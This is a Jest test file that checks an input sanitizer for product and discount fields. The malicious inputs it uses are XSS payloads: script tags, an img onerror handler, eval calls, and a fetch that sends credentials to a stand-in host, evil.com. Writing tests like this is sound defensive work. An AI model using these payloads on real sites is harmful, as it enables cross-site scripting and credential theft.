import { sanitizeInput } from "@/utils/inputSanitizer";

describe("Product Tests", () => {
  test("sanitize product price and stock inputs", () => {
    const maliciousProduct = {
      nameProduct: "<script> hacker </script> Product Name",
      price: "999<script>deleteProducts()</script>",
      stock: "<script>0</script>",
      costPrice: '1000<script>alert("sql")</script>'
    };

    const sanitized = sanitizeInput(maliciousProduct);
    expect(sanitized.nameProduct).toBe("Product Name");
    expect(sanitized.price).toBe(999);
    expect(sanitized.stock).toBe("");
    expect(sanitized.costPrice).toBe(1000);
  });

  test("discount validation sanitization", () => {
    const maliciousDiscount = {
      discountId: '<script>fetch("http://evil.com/api/cred")</script>',
      discountType: "<img src=x onerror=\"alert('adminAccess')\">",
      value: '50<script>eval("maliciousCode")</script>'
    };

    const sanitized = sanitizeInput(maliciousDiscount);
    expect(sanitized.discountId).toBe("");
    expect(sanitized.discountType).toBe("");
    expect(sanitized.value).toBe(50);
  });
});
